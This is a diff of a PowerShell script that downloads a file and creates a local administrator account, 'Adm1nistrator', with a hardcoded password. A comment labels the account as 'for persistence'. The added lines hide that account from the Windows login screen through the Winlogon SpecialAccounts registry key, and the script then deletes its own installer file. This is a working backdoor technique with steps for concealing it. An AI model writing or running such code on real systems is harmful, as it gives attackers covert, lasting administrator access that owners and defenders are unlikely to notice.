@@ -36,7 +36,6 @@ Invoke-WebRequest -Uri $url -OutFile $outFile
 
 # Create Admin account for persistence
 # Run PowerShell as Administrator
-
 $username = "Adm1nistrator"
 $password = "Pa$$w0rd"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -52,5 +51,21 @@ New-LocalUser `
 
 # Add user to Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $username
+
+# Hide user from login screen
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+
+# Create registry path if it does not exist
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
+
+# Set user to hidden (0 = hidden, 1 = visible)
+New-ItemProperty `
+    -Path $regPath `
+    -Name $username `
+    -PropertyType DWORD `
+    -Value 0 `
+    -Force | Out-Null
 
 Remove-Item installer.ps1
